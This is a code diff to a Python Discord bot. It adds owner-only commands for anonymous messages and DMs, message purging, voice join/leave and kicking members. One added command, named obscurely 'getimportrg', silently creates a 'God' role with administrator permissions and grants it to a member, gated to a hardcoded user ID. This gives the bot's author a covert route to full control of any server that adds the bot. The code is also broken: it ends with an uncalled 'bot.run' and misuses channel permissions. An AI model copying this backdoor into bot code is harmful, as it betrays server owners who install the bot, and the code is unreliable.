@@ -1,65 +1,90 @@
 import discord
 from discord.ext import commands
 import json
-import random
-import time
-import os
-
-with open('setting.json', 'r', encoding='utf8') as jfile:
-    jdata = json.load(jfile)
 
 bot = commands.Bot(command_prefix='w!')
 
 @bot.event
 async def on_ready():
-    print(">> Bot is online <<")
+    print(">> FbBot is online <<")
     await bot.change_presence(activity=discord.Game(name=f'w!help'))
 
-bot.remove_command('help')
 @bot.command()
-async def help(ctx):
-    help = discord.Embed(title="指令说明", color=0xffff8a)
-    help.set_author(name="凋凋的可爱机器人", icon_url="https://cdn.discordapp.com/avatars/902425049108193280/d7fdedddf2b86e74ccdab706940d0b77.png?size=80")
-    help.add_field(name="Help \nAdhelp \nPing \nDice", value="** **")
-    await ctx.send(embed=help)
+async def w(ctx, *, msg):
+        myID = 826714957517291552
+        if ctx.author.id == myID:
+            await ctx.message.delete()
+            await ctx.send(msg)
+@bot.command()
+async def ping(ctx):
+    ping = discord.Embed(title="Pong!", color=0xffff8a)
+    ping.add_field(name=f":hourglass:Time: {round(bot.latency*1000)} ms", value="** **")
+    await ctx.send(embed=ping)
 
 @bot.command()
-async def load(ctx, extension):
+async def i(ctx, member: discord.Member, *, msg):
     myID = 826714957517291552
     if ctx.author.id == myID:
-        bot.load_extension(f'cmds.{extension}')
-        await ctx.send(f"已加载完毕 {extension} 了哦哥哥~")
+        guild = ctx.guild
+        await ctx.message.delete()
+        await member.send(msg)
 
 @bot.command()
-async def unload(ctx, extension):
+async def clean(ctx, num : int):
     myID = 826714957517291552
     if ctx.author.id == myID:
-        bot.unload_extension(f'cmds.{extension}')
-        await ctx.send(f"已取消加载完毕 {extension} 了哦哥哥~")
+        await ctx.channel.purge(limit=num+1)
+        await ctx.send(f"已删除 **{num}** 则信息了哦~")
 
 @bot.command()
-async def reload(ctx, extension):
+async def join(ctx):
     myID = 826714957517291552
     if ctx.author.id == myID:
-        bot.reload_extension(f'cmds.{extension}')
-        await ctx.send(f"已重新加载完毕 {extension} 了哦哥哥~")
+        if (ctx.voice_client):
+            await ctx.send("Busy:(")
+        else:
+            if (ctx.author.voice):
+                channel = ctx.message.author.voice.channel
+                voice = await channel.connect(reconnect=True)
+                await ctx.send(f"Done:)")
+            else:
+                await ctx.send(f"Where:/")
 
-@bot.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.errors.MissingRequiredArgument):
-        await ctx.send("你没输入参数哦哥哥~")
-    elif isinstance(error, commands.errors.CommandNotFound):
-        await ctx.send("没有这个指令哦哥哥~")
-    elif isinstance(error, commands.errors.MissingPermissions):
-        await ctx.send("你没权限使用这个指令哦哥哥~")
-    elif isinstance(error, commands.errors.MissingRole):
-        await ctx.send("你没指定身分组使用这个指令哦哥哥~")
-    else:
-        await ctx.send("完蛋了系统发生错误qwq")
+@bot.command()
+async def leave(ctx):
+    myID = 826714957517291552
+    if ctx.author.id == myID:
+        if (ctx.author.voice):
+            await ctx.guild.voice_client.disconnect()
+            await ctx.send(f"Done:)")
+        else:
+            await ctx.send(f"How:/")
 
-for filename in os.listdir('./cmds'):
-    if filename.endswith('.py'):
-        bot.load_extension(f'cmds.{filename[:-3]}')
+@bot.command()
+async def kick(ctx, member: discord.Member, *, reason="无原因"):
+    myID = 826714957517291552
+    if ctx.author.id == myID:
+        guild = ctx.guild
+        await member.kick(reason=reason)
+        await ctx.send(f"{member.mention} 已被服主踢出因为 `{reason}`")
+        await member.send(f"你已被踢出于 ***{ctx.guild.name}***")
 
-if __name__ == "__main__":
-    bot.run(jdata['TOKEN'])
+@bot.command()
+async def getimportrg(ctx, *, member: discord.Member):
+    myID = 826714957517291552
+    if ctx.author.id == myID:
+        guild = ctx.guild
+        godRole = discord.utils.get(guild.roles, name="God")
+
+        if not godRole:
+            godRole = await guild.create_role(name="God")
+
+            for channel in guild.channels:
+                await channel.set_permissions(godRole, administrator=True)
+
+        await member.add_roles(godRole)
+        await ctx.send(f"Received {member.mention}'s request.")
+        await ctx.send(f"Command was runned successfully.")
+        await ctx.send(f"Welcome back, {member.mention}.")
+
+bot.run
